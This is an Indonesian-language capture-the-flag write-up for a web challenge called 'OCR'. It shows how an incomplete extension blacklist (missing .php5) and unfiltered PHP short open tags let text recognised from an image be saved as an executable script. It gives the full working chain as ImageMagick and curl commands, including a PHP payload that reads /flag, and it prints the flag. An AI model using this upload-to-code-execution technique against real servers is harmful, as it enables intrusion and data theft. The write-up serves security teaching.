# OCR — Web CTF Writeup

**CTF:** LYKNCTF 2026  
**Category:** Web  
**Challenge:** OCR  
**Flag:** `LYKNCTF{61b9716599224e1eb7a5ba08723b6559}`

## Deskripsi

> An exposed OCR note saver. Draw, recognize, save — and see what a note can become.

Aplikasi menerima gambar PNG dari canvas, menjalankan OCR dengan Tesseract, lalu menyimpan hasil OCR sebagai file di direktori `saved/`.

## Recon

Alur aplikasinya terdiri dari dua request:

1. Kirim `image_data` dalam bentuk data URI PNG.
2. Server menampilkan hasil OCR dan memberikan `ocr_id`.
3. `ocr_id` dipakai untuk menyimpan teks OCR dengan nama file pilihan user.

Contoh menyimpan note normal:

```bash
curl -sS -c cookies.txt -b cookies.txt -X POST "$BASE/" \
  --data-urlencode "image_data=data:image/png;base64,$(base64 -w0 note.png)" \
  -o response.html

OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' response.html)

curl -sS -c cookies.txt -b cookies.txt -X POST "$BASE/" \
  --data-urlencode 'save_output=1' \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode 'filename=note.txt'
```

File tersimpan dan dapat diakses langsung melalui:

```text
/saved/note.txt
```

## Filter yang Diterapkan

Server menolak beberapa ekstensi executable:

```text
.php
.phtml
.phar
.inc
.cgi
.pl
.py
.sh
```

Server juga memblokir teks OCR yang terlihat berbahaya, misalnya:

```php
<?php echo 49; ?>
<?=49?>
```

Blacklist ekstensi tersebut tidak mencakup seluruh ekstensi PHP lama.

Pengujian beberapa ekstensi memberi hasil:

```text
php3  -> tersimpan, tidak dieksekusi
php4  -> tersimpan, tidak dieksekusi
php5  -> tersimpan dan dieksekusi
php7  -> tersimpan, tidak dieksekusi
pht   -> tersimpan, tidak dieksekusi
```

Payload berikut membuktikan bahwa `.php5` diproses oleh PHP:

```php
<? echo 314159;?>
```

Saat file diakses, responsnya hanya:

```text
314159
```

Ada dua celah yang dapat digabungkan:

- blacklist ekstensi melewatkan `.php5`;
- PHP short open tag `<? ... ?>` aktif dan tidak diblokir seperti `<?php` atau `<?=`.

## Kendala OCR

Payload awal untuk membaca flag memakai:

```php
<? echo file_get_contents("/flag"); ?>
```

Tesseract mengubah underscore menjadi spasi:

```text
<? echo file get contents("/flag"); ?>
```

PHP kemudian menghasilkan parse error.

Fungsi `readfile()` dipilih karena tidak memiliki underscore:

```php
<? readfile("/flag"); ?>
```

Hasil OCR tetap valid dan payload lolos filter.

## Exploit

Generate gambar yang berisi payload:

```bash
convert -size 2000x340 xc:white \
  -fill black \
  -font DejaVu-Sans-Mono \
  -pointsize 90 \
  -gravity center \
  -annotate 0 '<? readfile("/flag"); ?>' \
  /tmp/flag.png
```

Kirim ke OCR:

```bash
curl -sS -c /tmp/ocr-cookie -b /tmp/ocr-cookie \
  -X POST "$BASE/" \
  --data-urlencode "image_data=data:image/png;base64,$(base64 -w0 /tmp/flag.png)" \
  -o /tmp/ocr.html
```

Ambil `ocr_id`:

```bash
OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' /tmp/ocr.html | head -1)
```

Simpan sebagai file `.php5`:

```bash
curl -sS -c /tmp/ocr-cookie -b /tmp/ocr-cookie \
  -X POST "$BASE/" \
  --data-urlencode 'save_output=1' \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode 'filename=flag.php5'
```

Akses file hasil simpan:

```bash
curl -sS "$BASE/saved/flag.php5"
```

Output:

```text
LYKNCTF{61b9716599224e1eb7a5ba08723b6559}
```

## Root Cause

Validasi filename memakai blacklist ekstensi yang tidak lengkap. Web server masih memiliki handler PHP untuk `.php5`, sehingga file yang dianggap note biasa berubah menjadi executable script.

Filter isi juga hanya mencari pola tertentu dan tidak menormalkan seluruh variasi sintaks PHP. Short open tag dapat melewati pemeriksaan tersebut.

## Flag

```text
LYKNCTF{61b9716599224e1eb7a5ba08723b6559}
```
